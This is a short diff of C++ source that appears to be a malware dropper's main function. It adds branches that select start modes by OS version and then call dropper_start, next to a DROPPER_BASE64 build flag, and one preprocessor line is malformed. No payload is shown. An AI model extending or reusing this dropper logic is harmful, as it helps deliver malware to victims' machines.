@@ -138,10 +138,27 @@ int main(int argc, char* argv[])
 
 	set_name(os_version);
 
-	// Handle to myself
-	h = GetModuleHandle(NULL);
+	int datalen = 0;
+	int start_array[2];
+
 	if (os_version == 0){
-		std::cout << "check_version failed. Cannot veriy OS version";
+		std::cout << "Couldn't verify the OS version";
+		datalen = 1;
+		start_array[0] = 3;
+
+	} else if (os_version == 6){
+		datalen = 2;
+		start_array[0] = 1;
+		start_array[1] = 2;
+
+	} else {
+		datalen = 1;
+		start_array[0] = 3;
+
+	}
+
+
+	if (os_version == 0){
 
 		dropper_start(3);
 	#ifdef DROPPER_BASE64 == 1
